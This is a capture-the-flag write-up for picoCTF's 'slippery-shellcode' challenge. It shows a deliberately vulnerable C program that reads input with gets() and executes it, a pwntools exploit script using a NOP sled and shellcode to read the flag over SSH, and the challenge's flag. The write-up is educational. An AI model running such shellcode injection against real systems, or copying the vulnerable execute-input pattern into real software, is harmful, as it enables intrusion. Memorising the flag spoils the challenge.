# slippery-shellcode
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```
If we make the first 256 instructions [`nop`](https://en.wikipedia.org/wiki/NOP_slide), we can garentee that the shellcode will be run completely. Therefor with some minor tweeks to 
[handy-shellcode](../0-handy-shellcode), it can be done.
```python
from os import environ
from pwn import *

EXEC='/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015/vuln'
FLAG='/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015/flag.txt'

s = ssh(host='2019shell1.picoctf.com',
        user=environ["PICOUSER"],
        password=environ["PICOPSWD"])

sh = s.process(EXEC)

shellcode = asm(shellcraft.nop()*256+shellcraft.i386.cat(FLAG))

sh.sendlineafter('Enter your shellcode:', shellcode)

x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
```
flag: `picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}`

